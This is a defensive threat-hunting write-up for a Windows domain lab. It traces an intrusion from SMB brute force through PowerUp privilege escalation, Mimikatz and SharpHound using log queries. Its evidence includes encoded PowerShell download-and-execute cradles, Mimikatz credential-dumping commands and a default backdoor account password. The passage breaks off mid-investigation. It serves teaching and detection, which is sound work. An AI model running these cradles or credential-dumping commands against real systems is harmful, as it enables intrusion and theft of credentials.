# Temple Writeup

# Introduction :

In this comprehensive write-up, we will embark on a guided journey through the Temple threat hunting lab, which is hosted on the SecDojo platform. This walkthrough will provide us with a detailed, step-by-step exploration of the investigative process, aiming to enhance our understanding of a cyber attack within a Windows environment. Throughout this narrative, we will dissect the various stages of the investigation, dissecting the tactics, techniques, and procedures employed by threat actors

# Objective 1: Our primary objective is to comprehend how the intruder managed to infiltrate our network. Subsequently, we will delve into the data to assess the extent of their impact. To achieve this, we must establish an initial hypothesis.

## Hypothesis:

Our hypothesis is that an attacker has successfully gained access to our network and established **persistence**.

Now, let's initiate our investigation into **persistence** techniques. We will commence by investigating one of the most commonly employed methods: scheduled tasks. Our approach involves searching for any processes that have been created and contain the term "schtasks" within their command line.

```yaml
Query : (event.code : (1 OR 4688) AND process.command.line : **schtasks**)
```

![Untitled](./pictures/1.png)

We have identified the creation of three scheduled tasks. One, named "**SecUpdate**" was created on the **Bastion** host, while the other two, named "**ADupdate**" and "**NewADupdate**," were created on the **Temple.secdojo.lab**.

Interestingly, all three tasks executed the same PowerShell command:

```powershell
powershell.exe -exec bypass -enc ZQBjAGgAbwAgACIAcABlAHIAcwBpAHMAdABlAG4AYwBlACIACgA=
```

Upon decoding the base64-encoded section, we reveal the following command: **`echo "persistence"`**

However, our primary focus isn't to delve deeply into this discovery. Our initial objective revolves around tracing the intruder's entry point. To achieve this, we will prioritize the first event among the six hits, based on the timestamp. Specifically, we will examine the scheduled task created by "**john**" on the **Bastion** host and track the associated **logonID** to ascertain john's activities on the **Bastion** host leading up to the creation of the scheduled task.

```yaml
Query : (winlog.logon.id : 0x8a11df) OR (winlog.event_data.LogonId : 0x8a11df)
```

winlog.event_data.LogonId : the LogonID field for sysmon

winlog.logon.id  : the LogonID field for windows events logs

While analyzing the created processes, we have come across some noteworthy findings:

1. The utilization of **Mimikatz** for the purpose of **credential dumping**.

2. Additionally, we've detected the utilization of **Sharphound**, with another user, "**tsilva**," to conduct domain enumeration within the **secdojo.lab** domain.

[https://lh6.googleusercontent.com/0gFzeqo_bS1v7K61hPEUXUpEeKv1uE5MGSzlqm4efD-ssCsrwAFznjKrxUNeCYkxMh1REBTX3V3N2Tr82qMOOxYtOydyiLd82uzaYt9BCsbN1AyH2EY1MWwkyBDraB7Dl6AbKlF6A6pUrMSZA7zisSE](https://lh6.googleusercontent.com/0gFzeqo_bS1v7K61hPEUXUpEeKv1uE5MGSzlqm4efD-ssCsrwAFznjKrxUNeCYkxMh1REBTX3V3N2Tr82qMOOxYtOydyiLd82uzaYt9BCsbN1AyH2EY1MWwkyBDraB7Dl6AbKlF6A6pUrMSZA7zisSE)

The information we've gathered so far is valuable, but for now, let's refocus on our primary objective: identifying the source of this breach. Upon analyzing login event ID 4624, we have identified a potential use of the "pass the hash" technique, specifically targeting the **Guest** account.

[https://lh6.googleusercontent.com/q2Uvt3_RufL00FeiC1zP8AwH5HrXFh7IPUqkwOfTcY3prPJ2-AI7-QBYWlDKcW87PfWCttjSZL0l2PHL9L4draYrw0V26buYh4hO89JBAKSEYvRn4Gfn2Z5A6cXQF2CSzxfK3CtMrETXunCxlGttxqY](https://lh6.googleusercontent.com/q2Uvt3_RufL00FeiC1zP8AwH5HrXFh7IPUqkwOfTcY3prPJ2-AI7-QBYWlDKcW87PfWCttjSZL0l2PHL9L4draYrw0V26buYh4hO89JBAKSEYvRn4Gfn2Z5A6cXQF2CSzxfK3CtMrETXunCxlGttxqY)

This appears intriguing, but we won't halt our investigation at this point. Instead, we will proceed by tracing the **logonID** of the subject user to further scrutinize their actions and determine the origin of these activities:

```yaml
Query : ((winlog.logon.id : 0x893c5f) OR (winlog.event_data.LogonId : 0x893c5f))
```

[https://lh3.googleusercontent.com/sfRzLl4QSzjpoOfG2U3qV3xSn4gVLypiGbpsTXOZ4ZhoVM2zK5GXI4JxMx-zDQ9EnDuxvPCzTUXC8djZ-gL--I4Vl2G5YLK3FDWjxyMzng1Jhv2vpuMapGKmG0hqF9HPoONEJHFkY-BEBD39CbW8LJ4](https://lh3.googleusercontent.com/sfRzLl4QSzjpoOfG2U3qV3xSn4gVLypiGbpsTXOZ4ZhoVM2zK5GXI4JxMx-zDQ9EnDuxvPCzTUXC8djZ-gL--I4Vl2G5YLK3FDWjxyMzng1Jhv2vpuMapGKmG0hqF9HPoONEJHFkY-BEBD39CbW8LJ4)

The event of particular interest here is the logon event where "**mark**" explicitly logs in as "**john**" with a LogonType of 2, which could suggest the use of a "**runas**" command.

Now that we've established that all the intriguing and suspicious activities initiated by "**john**" trace back to "**mark**," let's continue our investigation by tracking the **LogonID** associated with the subject user "**mark**" to gather further information:

```yaml
Query : (([winlog.logon.id](http://winlog.logon.id/) : 0x6fe292) OR (winlog.event_data.LogonId : 0x6fe292)) AND event.code:(1 OR 4688)
```

```yaml
Query : ((winlog.logon.id : 0x6fe292) OR (winlog.event_data.LogonId : 0x6fe292)) AND event.code:(1 OR 4688)
```

Once more, we will begin by filtering based on process creations to check if there are any noteworthy command lines:

[https://lh6.googleusercontent.com/ItlPtU6oIr1CLbN54sQ6KI7rChKPhQxsml2ddwFFgTWaQcWXZZoMkL2P87sLrA2H69SdhdEDL5ZbdK8ku20Z5UYfnoA-l0caF7KN9LLOdK77kLZYy55yEZjJp-JkQitQE-JGS-2J8pUKSjJo0jdlo_c](https://lh6.googleusercontent.com/ItlPtU6oIr1CLbN54sQ6KI7rChKPhQxsml2ddwFFgTWaQcWXZZoMkL2P87sLrA2H69SdhdEDL5ZbdK8ku20Z5UYfnoA-l0caF7KN9LLOdK77kLZYy55yEZjJp-JkQitQE-JGS-2J8pUKSjJo0jdlo_c)

Here we have some intriguing findings:

1. User enumeration.
2. Privilege checks.
3. A PowerShell command to download content from this URL: [**http://192.168.11.18:80/apt**](http://192.168.11.18/apt)
4. Two PowerShell encoded commands:
    - First command:
        
        ```powershell
        powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADEAOAA3ADMALwAnACkAOwAgAEkAbg2AG8AawBlAC0AQQBsAGwAYwBoAGUAYwBrAHMA
        
        ```
        
        Decoded base64 part: `IEX (New-Object Net.Webclient).DownloadString('<http://127.0.0.1:11873/>'); Invoke-Allchecks`
        
    - Second command:
        
        ```powershell
        powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbg0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADgAMgAyADMALwAnACkAOwAgAEkAbg2AG8AawBlAC0AUwBlAHIAdgBpAGMAZQBBAGIAdQBzAGUAIAAtAE4AYQBtAGUAIAAnAFMATgBNAFAAJwA=
        
        ```
        
        Decoded base64 part: `IEX (New-Object Net.Webclient).DownloadString('<http://127.0.0.1:38223/>'); Invoke-ServiceAbuse -Name 'SNMP'`
        

These findings present us with another hypothesis to explore later, involving PowerShell event logs, which could potentially yield more artifacts.

However, let's stay focused on our current goal. We should now examine the logon event associated with this particular **logonID** :

[https://lh4.googleusercontent.com/wPj5azhOXzYqjhXOn9uk5vU2dz-l09AxzZT6B8kj6oqr59KXXAeMAGfDASTTFYgjcqUA1MmlmUY3H4Wy-HvFopWBZ8HS7lhWf7_7Fp0CgPZY_ubPwkrOoxbyLZn0TXvck4yYTnfJgLLLM0knCOMKyXA](https://lh4.googleusercontent.com/wPj5azhOXzYqjhXOn9uk5vU2dz-l09AxzZT6B8kj6oqr59KXXAeMAGfDASTTFYgjcqUA1MmlmUY3H4Wy-HvFopWBZ8HS7lhWf7_7Fp0CgPZY_ubPwkrOoxbyLZn0TXvck4yYTnfJgLLLM0knCOMKyXA)

We've come across a constraint in our ability to trace the subject user's logonID, as it pertains to the local system itself. However, this presents an opportunity rather than a setback. We can take note of this information and leverage it to construct more inquiries and hypotheses for our ongoing investigation.

Specifically, it seems that "mark" has instigated the suspicious activities we've identified. Consequently, we can proceed with the assumption that "mark" is the compromised user and proceed with a thorough examination of events leading up to this logon:

[https://lh3.googleusercontent.com/8Am4xVYneeZfZHya3urWUFGAtxGfjLpRwm5An9pFcHU23gwdumRHvo2FGbDBKVW-mZx8IL-rPArQu1QGMKlZydIwTlgbzx3Czki192OnOxzbBYVdMUZcO-2QWZTVeMvfiaUlu8d2XZrEVPUuIrBpBXQ](https://lh3.googleusercontent.com/8Am4xVYneeZfZHya3urWUFGAtxGfjLpRwm5An9pFcHU23gwdumRHvo2FGbDBKVW-mZx8IL-rPArQu1QGMKlZydIwTlgbzx3Czki192OnOxzbBYVdMUZcO-2QWZTVeMvfiaUlu8d2XZrEVPUuIrBpBXQ)

Upon filtering by **[user.name](http://user.name/):mark**, we observed a potential brute force pattern involving the "**mark**" user from the IP address **192.168.11.18**. Interestingly, this IP is the same one from which we identified that "**mark**" downloaded something using a PowerShell command. Notably, the brute force attempts culminated in a **successful login**.

Subsequently, we noted an **RDP** login from IP address **192.168.11.55**.

With this information in hand, let's now investigate the type of activity originating from the IP address **192.168.11.18**:

[https://lh4.googleusercontent.com/f77Q4rx9-SXc4oBAxVjBPE_kbCU6SYvDfaiMHR8OglXIC47B_vD73zEAQ-jUvRnMRAvfg9l-ehmoP24BTBjXJEIkeSPiBvG62H1wNBvafL_E9HcV1sXwzELrgxQtAsy5BtMKZN_cxeHSubCSmSl1Xbs](https://lh4.googleusercontent.com/f77Q4rx9-SXc4oBAxVjBPE_kbCU6SYvDfaiMHR8OglXIC47B_vD73zEAQ-jUvRnMRAvfg9l-ehmoP24BTBjXJEIkeSPiBvG62H1wNBvafL_E9HcV1sXwzELrgxQtAsy5BtMKZN_cxeHSubCSmSl1Xbs)

[https://lh4.googleusercontent.com/gPEXpgwmxrueFlpKlHsBycZ9kfliUtAPZDQ1fzNjDIzEFjQX77yymGsS7Pg2syOls7vRQDk0D1oK-1IbOo-5VZo05Ob57nqYXFOiUpEMwCOtVVoxO6-TVBsPzku1D3euUkmjC55xSej2Aiv9B8sg6po](https://lh4.googleusercontent.com/gPEXpgwmxrueFlpKlHsBycZ9kfliUtAPZDQ1fzNjDIzEFjQX77yymGsS7Pg2syOls7vRQDk0D1oK-1IbOo-5VZo05Ob57nqYXFOiUpEMwCOtVVoxO6-TVBsPzku1D3euUkmjC55xSej2Aiv9B8sg6po)

We've observed an intriguing pattern: following a successful login from a brute force attempt, there's immediate access to the \\*\IPC$ ShareName within the same minute. This strongly suggests that the brute force attack was conducted using the **SMB** (Server Message Block) protocol, potentially through a tool like **CrackMapExec**.

To further validate this hypothesis, I conducted an internet search and came across an event ID related to SMB authentication, which is event ID **551**:

[https://lh5.googleusercontent.com/2V9Vd1PkwPo5JEeFCGLDbskzd0CqS12Zfk0Ib3UFbd2sLg5eR7U_BFai1Tt9Bo5Pg0yXFYzMC7G68q-To5CNXgNaSqhqpGJl6JvpRj8lf10feOShqNb_A8_UvoqCkcyybRECHWoor1rAEzJIgPqwrjQ](https://lh5.googleusercontent.com/2V9Vd1PkwPo5JEeFCGLDbskzd0CqS12Zfk0Ib3UFbd2sLg5eR7U_BFai1Tt9Bo5Pg0yXFYzMC7G68q-To5CNXgNaSqhqpGJl6JvpRj8lf10feOShqNb_A8_UvoqCkcyybRECHWoor1rAEzJIgPqwrjQ)

Indeed, we've noted a total of **57 Smb2SessionAuthFailure events**, corresponding precisely to the number of failed login attempts and occurring simultaneously. This confirmation aligns with our initial hypothesis regarding the use of **SMB for the brute force attack**.

Additionally, we've observed that the attacker proceeded to list the **Users** and **Public** directories. Furthermore, they placed a text file named "**local.txt**" and an **lnk** file (shortcut) in the **Public** folder:

[https://lh3.googleusercontent.com/3nYj7jkcLzJuTN_yJJ5oGOr0nlzsecGLXJZWc5cSrsPa59OS3t5h7XEtxyVwK0ch0DY2V4sKyvVIoTJxL6BcZRIX8jUFxyeZtxNEZmsc-cwFIRFXJmqL1cYWHTbLwn1krrX4FgHgXoG8RNzs7xe5zrM](https://lh3.googleusercontent.com/3nYj7jkcLzJuTN_yJJ5oGOr0nlzsecGLXJZWc5cSrsPa59OS3t5h7XEtxyVwK0ch0DY2V4sKyvVIoTJxL6BcZRIX8jUFxyeZtxNEZmsc-cwFIRFXJmqL1cYWHTbLwn1krrX4FgHgXoG8RNzs7xe5zrM)

We have successfully accomplished our first goal, which was to determine how the intruder gained access to the network.

Here is the timeline of events:

**Initial Access:**

- Occurred on May 1, 2023, between 23:21:09.368 and 23:21:09.748.
- The attacker employed a brute force attack utilizing the SMB protocol, targeting the "mark" username, and successfully gained access.

**Subsequent Activity:**

- On May 1, 2023, at 23:32:27.084, there was a login via RDP from IP address 192.168.11.55 to the BASTION Workstation.
- As a result, the attacker now possesses access to the BASTION workstation through the "mark" account. Their potential next steps could include enumeration, privilege escalation, and lateral movement within the domain.

Our next objective is to track and investigate the actions taken by the attacker following their RDP login.

# Objective 2: Our second objective is to trace the activities of the compromised account "**mark**" and understand how the attacker moved in the network.

Hypothesis :
The attacker utilized the compromised "**mark**" account for **internal reconnaissance** within the network.

To initiate our investigation into **internal reconnaissance**, we will begin by employing CAR analytics, specifically focusing on "CAR-2013-04-002: Quick execution of a series of suspicious commands." You can find more details about this analytics approach at [CAR-2013-04-002](https://car.mitre.org/analytics/CAR-2013-04-002/).

```yaml
Query : event.code:(1 OR 4688) AND process.executable:(*arp.exe* OR *at.exe* OR *attrib.exe* OR *cscript.exe* OR *dsquery.exe* OR *hostname.exe* OR *ipconfig.exe* OR *nbstat.exe* OR *net.exe* OR *net1.exe* OR *netsh.exe* OR *nslookup.exe* OR *ping.exe* OR *quser.exe* OR *qwinsta.exe* OR *reg.exe* OR *runas.exe* OR *sc.exe* OR *ssh.exe* OR *systeminfo.exe* OR *taskkill.exe* OR *telnet.exe* OR *tracert.exe* OR *wscript.exe* OR *xcopy.exe* OR *whoami.exe*)
```

When we filter the results by examining the created processes, we uncover some intriguing findings:

[https://lh5.googleusercontent.com/XXlP3bjcoeRF9EXUVNIozPiDpPue5QlRUkhUZLa4cvZLxATBO1g7Tke-KiZ51jLSoGxzYUDvMGmDGwJB5ptRaB1b643VYIiM00ZKay8NQQ-ytMokAaH2oipczWI20ctmSLyt9WW1NHSBh5WhUe-7Xr4](https://lh5.googleusercontent.com/XXlP3bjcoeRF9EXUVNIozPiDpPue5QlRUkhUZLa4cvZLxATBO1g7Tke-KiZ51jLSoGxzYUDvMGmDGwJB5ptRaB1b643VYIiM00ZKay8NQQ-ytMokAaH2oipczWI20ctmSLyt9WW1NHSBh5WhUe-7Xr4)

Let's concentrate first on the Bation Workstation :

[https://lh4.googleusercontent.com/L-0RgtD4nKP1Q3ojCAk4gzSZ8XML7HqBcCfIxGVZI6Bc5JaV0o3tkUa-QhXHXbqSpymBV6RC6jSjsb8RGiWI9SbI2C83YmiC_yAzIIUhOauUsWHm5Yp8FeJKFXIAMPt_RQpqdUNY6UprpkHbXHCu3XM](https://lh4.googleusercontent.com/L-0RgtD4nKP1Q3ojCAk4gzSZ8XML7HqBcCfIxGVZI6Bc5JaV0o3tkUa-QhXHXbqSpymBV6RC6jSjsb8RGiWI9SbI2C83YmiC_yAzIIUhOauUsWHm5Yp8FeJKFXIAMPt_RQpqdUNY6UprpkHbXHCu3XM)

We observe the following:

- The user "**john**" was created by the **SYSTEM**, which raises suspicion.
- "**john**" was subsequently added to the local Administrators group on the Bastion workstation.
- Following this, the attacker attempted to enumerate users and verify the existence of the "**john**" account.

To gain a deeper understanding of these events, we will proceed by tracking the process tree.

[https://lh4.googleusercontent.com/6XnkKwLlRReZcjp0jp9dvXTa177m5HwpcViVt0b17hL2ZQ1-ok_ut1D8leUD5xu9xskTltwvhJjrx16Z5yvstE4DW5iHfG_SIn2BfOyy32iY3bH4ejXWHhiJrWYZxJS9cFzcUBNZ4wbLOpqkB57eK-0](https://lh4.googleusercontent.com/6XnkKwLlRReZcjp0jp9dvXTa177m5HwpcViVt0b17hL2ZQ1-ok_ut1D8leUD5xu9xskTltwvhJjrx16Z5yvstE4DW5iHfG_SIn2BfOyy32iY3bH4ejXWHhiJrWYZxJS9cFzcUBNZ4wbLOpqkB57eK-0)

We will commence by examining the initial process based on its timestamp and tracing its parent process ID :

Queries :

```yaml
(process.pid:4948) OR (process.parent.pid:4948)
```

```yaml
(process.pid:3312) OR (process.parent.pid:3312)
```

```yaml
(process.pid:3800) OR (process.parent.pid:3800)
```

Below is the process tree:

[https://lh5.googleusercontent.com/AqnjtgzirIt31cGa_u3n5JhWtkIJAnN1or5Es29bZlQIZq7P4ZBkSsva5viwa1aw9sTTxc1MK7y9YD1zUsw6VbDDA21gZ30ioZrAoGWPtK2IAooHxnmYNo5D9X-SF8wiDUCRXLRgbNqMzvZ6laqwjEg](https://lh5.googleusercontent.com/AqnjtgzirIt31cGa_u3n5JhWtkIJAnN1or5Es29bZlQIZq7P4ZBkSsva5viwa1aw9sTTxc1MK7y9YD1zUsw6VbDDA21gZ30ioZrAoGWPtK2IAooHxnmYNo5D9X-SF8wiDUCRXLRgbNqMzvZ6laqwjEg)

Now, let's investigate and track the actions of process ID **4948**:

From a network standpoint, there's a significant amount of communication originating from the "bastion" workstation towards the IP address "192.168.11.18" on port "80." This strongly suggests the possibility that this IP address serves as the Command and Control (C2) server for the attacker.

[https://lh6.googleusercontent.com/Vv8tSIZ_DDbnMN_7QCsGCCzEGJI0jdncfHovaWt66IWzLOvv1YeA-RtYWcsDnm-Ej1b4tkH0Hj_nKV6sTtZ5Lkmj3NNSaDKyG0fm9XwRKQGiQeRaRK7eV1xAEAlfaeD9_OPR-xK6vZh-KnyBetaVqJs](https://lh6.googleusercontent.com/Vv8tSIZ_DDbnMN_7QCsGCCzEGJI0jdncfHovaWt66IWzLOvv1YeA-RtYWcsDnm-Ej1b4tkH0Hj_nKV6sTtZ5Lkmj3NNSaDKyG0fm9XwRKQGiQeRaRK7eV1xAEAlfaeD9_OPR-xK6vZh-KnyBetaVqJs)

The additional events associated with **process ID 4948** involve the creation of other processes and files:

[https://lh3.googleusercontent.com/hD7wpWN6W1ud9aeCtnvkSfp2uJhO1Imq2V2Llx7-dggphHcSUfvdfTZsHiV7-0yB44rAvYMVRRMBq81A19qKHtpP-R8x90O3IR81a3sYto0USYp5P7rwOH8NdPtk2tiU7UHwtqC3FbzHE33v3mRJnp8](https://lh3.googleusercontent.com/hD7wpWN6W1ud9aeCtnvkSfp2uJhO1Imq2V2Llx7-dggphHcSUfvdfTZsHiV7-0yB44rAvYMVRRMBq81A19qKHtpP-R8x90O3IR81a3sYto0USYp5P7rwOH8NdPtk2tiU7UHwtqC3FbzHE33v3mRJnp8)

Since we intend to track all the noteworthy processes created later, let's initially focus our attention on the files that have been created:

[https://lh6.googleusercontent.com/16B2zvRpS9A2dSPtGbzCV8DnAdpDEddnKYdBgQgImvd4G3W5lvBdxy7C6EGi0M2EM2jmbvU8gVBZ_2R6mWZWj7wxLeORgdC9bpQfb4QBduyqrtpOwsnwX-5PZ9iqpjZx2wo9s42keY2xcXmlmR3ufmE](https://lh6.googleusercontent.com/16B2zvRpS9A2dSPtGbzCV8DnAdpDEddnKYdBgQgImvd4G3W5lvBdxy7C6EGi0M2EM2jmbvU8gVBZ_2R6mWZWj7wxLeORgdC9bpQfb4QBduyqrtpOwsnwX-5PZ9iqpjZx2wo9s42keY2xcXmlmR3ufmE)

As we examine the files, we come across an intriguing one named "**PowerUp.ps1**." This file serves as a tool designed to facilitate quick checks for potential privilege escalation opportunities on a Windows machine.

It's plausible that this script was downloaded from the C2 server at **192.168.11.18**.

To comprehend the script's behavior, we will refer to the provided [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/). There are essential phases involved in executing the script that will help us detect its actions:

1. Importing the "**PowerUp.ps1**" module.
2. Running all the checks included in the module using the command **Invoke-AllChecks**.
3. After selecting the target service, running the command **Invoke-ServiceAbuse -Name 'TargetServiceName'**.

To detect the execution of this script, we will search in the PowerShell logs.

```yaml
Query : event.code:(800) AND powershell.command.value:("*Invoke-AllChecks*" OR "*Invoke-ServiceAbuse -Name*")
```

[https://lh5.googleusercontent.com/le5uKfEtkshGwaVKhMMUxaW5li2bhJsDKjpCtdQqFgFlm96KMwrCEeymhEFjpzdELFMVENxT1o4246c57IrkBF3UXGJAjFGpVKEJ2Gas0BPQs6erluvL_PpoYikCyCChNECuguLGMgDZjKqVYBmUEVY](https://lh5.googleusercontent.com/le5uKfEtkshGwaVKhMMUxaW5li2bhJsDKjpCtdQqFgFlm96KMwrCEeymhEFjpzdELFMVENxT1o4246c57IrkBF3UXGJAjFGpVKEJ2Gas0BPQs6erluvL_PpoYikCyCChNECuguLGMgDZjKqVYBmUEVY)

As we can discern, the attacker's intention was to exploit the SNMP service.

Referring to the [cheat sheet](https://blog.certcube.com/powerup-cheatsheet/), when the command **Invoke-ServiceAbuse -Name 'TargetServiceName'** is executed without customizing the script (as is the case here), it results in the creation of a user named **john** with the password **Password123!**. Furthermore, this user is added to the local group **administrators**.

Recall that when we initially embarked on our hunt for **internal reconnaissance**, we made the following observations:

- The user "**john**" was created by the SYSTEM.
- "**john**" was added to the Administrators local group on the Bastion workstation.

These observations align with the script's actions, indicating that the attacker utilized it to achieve privilege escalation :

![Untitled](Temple%20Writeup%20250eca1d8c714ad58a49c533430e1e3d/Untitled.png)

Upon tracking the parent process ID of the identified processes, we discovered that the **PowerUp.ps1** script was responsible for creating the user "**john**" and subsequently adding this user to the **administrators** group. This action was achieved by modifying the registry key associated with the exploited service, namely **SNMP**.

It's important to note that after completing the creation of the user "**john**" and adding them to the local **administrators** group, the script reverted the registry back to its original service executable state :

[https://lh3.googleusercontent.com/ZtvMhaXpB4iGnMhmRJmgaO2eSNdDPy1jK2Ycbb9r0V4GmJzGzDmDAlYflZ6NZFHLfw4GAabkvpUpjg2dbC152xY7tEDYh7oWUQ7fxBgN0yCNRodA188L2AArFAdF39_DBTfMxt8VPBnMkXlCLAdDffA](https://lh3.googleusercontent.com/ZtvMhaXpB4iGnMhmRJmgaO2eSNdDPy1jK2Ycbb9r0V4GmJzGzDmDAlYflZ6NZFHLfw4GAabkvpUpjg2dbC152xY7tEDYh7oWUQ7fxBgN0yCNRodA188L2AArFAdF39_DBTfMxt8VPBnMkXlCLAdDffA)

Now that we've completed our examination of the file creation events associated with PID 4948, we've established the following results:

- The attacker exploited the **SNMP** service using **PowerUp.ps1** tool.
- They created a user named "**john**" and added this user to the local **administrators** group on the Bastion workstation.

As a consequence, the attacker now possesses administrative privileges on the host named **Bastion**.

Next, we'll proceed to track the remaining events related to PID **4948** in order to potentially uncover more significant information:

[https://lh3.googleusercontent.com/edygMZYipm5qemW82m_Hl7gVExRXZpZse0GMR70SKEdTE1xC2ZKfdK_bVaypbqS7PnIYoDI9g-8jo5nQ4_u-KEZUW17Die-LEgGXXu3_QgT_ngse9lIxv2GrunZutO_gXdLiaf3Owhx6d2dX9uUTf3U](https://lh3.googleusercontent.com/edygMZYipm5qemW82m_Hl7gVExRXZpZse0GMR70SKEdTE1xC2ZKfdK_bVaypbqS7PnIYoDI9g-8jo5nQ4_u-KEZUW17Die-LEgGXXu3_QgT_ngse9lIxv2GrunZutO_gXdLiaf3Owhx6d2dX9uUTf3U)

We will proceed to track process ID **6436**, which was executed by the user "**john**”:

```yaml
Query : (process.pid:6436) OR (process.parent.pid:6436)
```

[https://lh4.googleusercontent.com/JBE84a9feFhAUgQqAhQObtWmcePIxMeN8b2Mioez-EsxlnMaH7MJHvEbx99BNXea4TtmUdfmGhnSnRY__3-il0VAo63tTZluqYA6LSI4GGROtOvFOcnBJ8H5BWmA71-m-KkEOXvVK1hOPfIdqz8ITKQ](https://lh4.googleusercontent.com/JBE84a9feFhAUgQqAhQObtWmcePIxMeN8b2Mioez-EsxlnMaH7MJHvEbx99BNXea4TtmUdfmGhnSnRY__3-il0VAo63tTZluqYA6LSI4GGROtOvFOcnBJ8H5BWmA71-m-KkEOXvVK1hOPfIdqz8ITKQ)

Once more, we will proceed by examining the last process based on its timestamp, which holds the PID **5880**, as the preceding ones do not appear to have notable elements to track:

```yaml
Query : (process.pid:5880) OR (process.parent.pid:5880)
```

[https://lh3.googleusercontent.com/kRDXW_P4wieUZJJC8LQHI5J7GZrPYO5f1UTkW9adeBAK8y87in266OXN80Dj-Lg974h6zLc3spFNLsAheV8q50NbSXzRNPHdNDECu17Mrla4-DXCsaCzCxWgqUup8dthS7Gwhtg_P77BjU5D6Zh41zw](https://lh3.googleusercontent.com/kRDXW_P4wieUZJJC8LQHI5J7GZrPYO5f1UTkW9adeBAK8y87in266OXN80Dj-Lg974h6zLc3spFNLsAheV8q50NbSXzRNPHdNDECu17Mrla4-DXCsaCzCxWgqUup8dthS7Gwhtg_P77BjU5D6Zh41zw)

Focusing on the events related to process creation and file creation, we observe the following:

- The creation of a scheduled task by John, which we previously identified during our initial hypothesis.
- The creation of two files, which may have been downloaded from the C2 server:
    - **C:\Users\mark\Documents\mimikatz.exe** (Mimikatz is a tool commonly used for extracting sensitive information, such as passwords and credentials, from a system's memory. It is typically employed for unauthorized network access, privilege escalation, lateral movement, and other malicious activities.)
    - **C:\Users\mark\Documents\SharpHound.exe** (SharpHound is the official data collector for BloodHound, written in C#. It gathers data from domain controllers and domain-joined Windows systems using native Windows API functions and LDAP namespace functions.)

Let's begin by focusing on Mimikatz. Our initial step is to conduct a basic search for a process creation command line containing the term **mimikatz:**

```yaml
Query: event.code : (4688 OR 1) AND process.command_line:*mimikatz*
```

[https://lh3.googleusercontent.com/_vjaM80fi7rXDKkCs6KIqDCpu0TJhk02FcGePLTP3aPoxgOZcp2pmSIWYbqOWJPefYgeJFI783e-kmfRovV65ewV5eDD6YdkeqX7TrsPbgXrzwC101LiznBU9PInpFYHzENj2HW58nSt0fKToQDdE20](https://lh3.googleusercontent.com/_vjaM80fi7rXDKkCs6KIqDCpu0TJhk02FcGePLTP3aPoxgOZcp2pmSIWYbqOWJPefYgeJFI783e-kmfRovV65ewV5eDD6YdkeqX7TrsPbgXrzwC101LiznBU9PInpFYHzENj2HW58nSt0fKToQDdE20)

Analyzing the executed commands:

- **sekurlsa::logonpasswords**: If successful, Mimikatz will generate a list of cleartext passwords for all currently and recently logged-on users and computers.
- **lsadump::sam**: This command dumps the NT hashes from the local Security Account Manager (SAM).

These commands imply that the attacker may have acquired **cleartext passwords or NT hashes for some domain users**.

This revelation provides context for the presence of the SharpHound tool. If the attacker has access to domain user credentials, they can employ SharpHound to enumerate the AD domain. Let's proceed with a basic search for the execution of SharpHound:

```yaml
Query: event.code : (4688 OR 1) AND process.command_line:*SharpHound*
```

[https://lh3.googleusercontent.com/8WpFMxAI2ljdLoz-tIuglynS2wcoUPxFw-g4ttxm4YvNhDJLrA96XcwEKvvn6Kkkn7pajpjfnoBShN5WDDaLyd4vReah4Q-SF5bZXw3D9Vt1tGvUybeYCIoJI3NA2RXWBjxToxg74SQ_sN_hYdWM87U](https://lh3.googleusercontent.com/8WpFMxAI2ljdLoz-tIuglynS2wcoUPxFw-g4ttxm4YvNhDJLrA96XcwEKvvn6Kkkn7pajpjfnoBShN5WDDaLyd4vReah4Q-SF5bZXw3D9Vt1tGvUybeYCIoJI3NA2RXWBjxToxg74SQ_sN_hYdWM87U)

It is evident that the attacker possesses the password for a domain user account named **tsilva**, which has been employed to enumerate the domain using the **SharpHound** tool.

Now, let's investigate the activities conducted by the attacker using the "**tsilva**" user account.

```yaml
Query : (related.user:/[Tt][Ss][Ii][Ll][Vv][Aa]/) OR (winlog.event_data.TargetUserName:/[Tt][Ss][Ii][Ll][Vv][Aa]/) OR (winlog.event_data.SubjectUserName:/[Tt][Ss][Ii][Ll][Vv][Aa]/) OR **(winlog.event_data.TargetUser**:/[Tt][Ss][Ii][Ll][Vv][Aa]/**) OR (winlog.event_data.User**:/[Tt][Ss][Ii][Ll][Vv][Aa]/**) OR (winlog.event_data.SourceUser**:/[Tt][Ss][Ii][Ll][Vv][Aa]/**)**
```

[https://lh3.googleusercontent.com/hG3qEeOhggU9V4XPcuTL9HFVlmTS95MzzqTnU9wI8rXYgUX6fQpikqfIfyDI_2kSz_R8Vpuwfyz7MktfeUV5P9IUADhLFykVkEW-h9RpKb_l0tPRJo7JZZLrYHrEiMllsBAj4ZBmSpc8vxQptUEhPYY](https://lh3.googleusercontent.com/hG3qEeOhggU9V4XPcuTL9HFVlmTS95MzzqTnU9wI8rXYgUX6fQpikqfIfyDI_2kSz_R8Vpuwfyz7MktfeUV5P9IUADhLFykVkEW-h9RpKb_l0tPRJo7JZZLrYHrEiMllsBAj4ZBmSpc8vxQptUEhPYY)

From the logs, we can discern that the attacker executed the following actions using the "tsilva" user account:

1. There was an explicit logon by "**john**" as a "**tsilva**" user, originating from the **BASTION** workstation and connecting to the DC "**Temple.secdojo.lab**" This login was used to launch the SharpHound command for domain enumeration.
2. "**tsilva**" was logged into the DC from the attacker's C2 server, which happens to be a **KALI** machine.
3. "**tsilva**" reset the password for another user named "**FVidal**."

Following the completion of these actions, the attacker logged out from the "**tsilva**" account, and there don't appear to be any other significant activities associated with it in the logs.

At this juncture, the next step is to follow a similar investigative process with the "**FVidal**" user account and determine what the attacker has done with it :

```yaml
